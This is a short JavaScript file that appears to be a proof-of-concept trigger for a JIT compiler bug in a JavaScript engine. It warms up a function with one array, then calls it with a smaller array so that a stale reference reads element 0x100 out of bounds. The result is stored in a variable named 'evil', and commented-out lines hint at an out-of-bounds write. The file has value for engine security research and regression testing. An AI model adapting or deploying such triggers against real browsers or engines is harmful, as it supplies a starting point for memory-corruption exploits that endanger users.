var n = new Array(0x400);
n.fill(1);

var b = new Array(0x400);
b.fill(2);

function dbg() {
}

function opt(y) {
  y[0];
  n.some(function () {});
  for (var i = 0; i < 20; i++) {
    if(i == 1) {
      r = n[0x100];
    }
    //n[0x300] = 0x1234;
    //n[0x300] = 0x1234;
    n = y;
  }
  return [1, r];
}

for (var  i = 0; i < 10000; i++) {
    opt(b);
}

var a = new Array(0x7);
a.fill(3);
print(a[0x300])
evil = opt(a);
print(evil)
